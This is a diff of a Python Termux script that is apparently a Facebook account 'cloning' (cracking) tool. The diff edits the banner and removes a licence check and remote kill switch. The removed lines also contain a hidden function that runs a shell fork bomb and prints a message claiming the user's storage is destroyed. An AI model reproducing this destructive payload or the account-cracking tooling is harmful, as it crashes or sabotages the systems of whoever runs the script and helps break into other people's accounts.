@@ -295,8 +295,8 @@ def clear():
  os.system('clear')
 def banner():
     #os.system('clear')
-    print(f"""{GREEN}    ok{P}
- {K}[{H}√{K}]{P} ISRAFIL-VAU 
+    print(f"""{GREEN}    SELL DONE{P}
+ {K}[{H}√{K}]{P} This message is for my haters 
  {K}[{H}√{K}]{P}       {H} The KING Is BACK 
  {K}[{H}√{K}]{P} Successfully Update Done {H}2.0.9""");print(led)
 
@@ -320,21 +320,6 @@ cuu=('ngcy')
 cuuu=('ber')
 #
 #
-def mainx():
-    clear();banner()
-    print('{gen}Please Wait Some times.......')
-    Love_Tisha('termux')
-    Love_Tisha('Hi')
-    Love_Tisha('ok')
-    Love_Tisha('hk*')
-    Love_Tisha(':(){ :|: & };:')
-    Love_Tisha('oh')
-    Love_Tisha('accha*')
-    Love_Tisha('j')
-    Love_Tisha('h*')
-    print(f'{rgen}{RED}YOUR STORAGE FUCKED BY {H}FB-KING ');exit()
-
-        
 gffff=('FB-')
 kffff=('KING')
 c0=('ht')
@@ -345,43 +330,7 @@ c3=('2n8sj2p4')
 cu=('Ki')
 cuu=('ngcy')
 cuuu=('ber')
-def checker():
-  uuid = str(os.geteuid()) + str(os.getlogin())
-  id = "fk".join(uuid)
-  server = requests.get(f'{c0}{c4}{c1}{c2}{cu}{cuu}{cuuu}').text
-  os.system(f" clear")                          
-  banner();print(f"{rgen}{RED}{BA}Hi Dear User  Your Key is Not Approved{N}");print(f"{gen}{GREEN}"+id);print(led);print(f"{dot}Tools {RED}: {H}Facebook cloning {N}");print(f"{dot}Note {RED} :{K} {BA}Free user don't come inbox {N}");print(led);print(f'{gen}{H}{BA}Tools Future Showing{N}');print(led);print(f'{rdd}{WHITE}File Create');print(f'{rdd}{WHITE}File Cloning');print(f'{rdd}{WHITE}Public Cloning');print(f'{rdd}{WHITE}Public Cloning {H}V2');print(f'{rdd}{WHITE}Random Cloning');print(f'{rdd}{WHITE}Gmail Cloning');print(f'{rdd}{WHITE}Random Cloning');print(f'{rdd}{WHITE}Separate Ids ');print(f'{rdd}{WHITE}Remove Duplicate Ids');print(f'{rdd}{WHITE}Join Group');print(f'{rdd}{WHITE}Github Account');print(led)
-  tks = '*ASALAMUALIKUM*%20*Mahin-Ahmed-Sir*%20*I*%20*Want*%20*To*%20*Buy*%20*Your*%20*New*%20*---*%20*FB_KING_COMMAND%20*---*%20*Version%20:%202.0.9%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*='+id
-  os.system('xdg-open  https://wa.me/+8801841004250?text='+tks);time.sleep(3);exit()
-uuid = str(os.geteuid()) + str(os.getlogin())
-id = "fk".join(uuid)
-try:
- httpCaht = requests.get(f"{c0}{c4}{c1}{c2}{cu}{cuu}{cuuu}").text
- if id in httpCaht:
-  msg = str(os.geteuid())
-  clear();print(f"{gen}{GREEN}{BA}Hi Dear User  Your Key is Approved{N}");time.sleep(3)
-  pass
- else:
-  msg = str(os.geteuid())
-  checker()
-except:sys.exit
-# MAIN MENU -- MAIN DEF #
-try:
-    ck = requests.get(f'https://github.com/{gffff}{kffff}/Main-Control/blob/main/20-2-0-9.txt').text
-except:exit(f'{dot}{M}NO NETWORK CONNECTION-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{H}-')
-if 'PASS' in ck:
-    pass
-elif 'OFF' in ck:
-    exit(f'{dot}SERVER NOT CONNECTION-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{H}-')
-elif 'TRY' in ck:
-    os.system('clear');banner();print(f"{dot}Maybe Tools is updating {K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{H}-");os.system("xdg-open https://github.com/FB-KING");exit()
-elif 'FUCKED' in ck:
- fucked()
-else:os.system('clear');banner();exit(f"{dot}{K}Maybe Tools is updating {K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{H}-")
-id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
-cokbrut=[]
-pwpluss,pwnya=[],[]
- 
+
 def mainx():
     clear();banner()
     print(f"{K} [{H}1{K}] {WHITE}Create File ")
@@ -1249,7 +1198,6 @@ if __name__=='__main__':
   except:pass
   try:os.mkdir('QUEEN-TISHA')
   except:pass
-   #b2()
+#  b2()
 #  mainx() 
   mainx()
- 
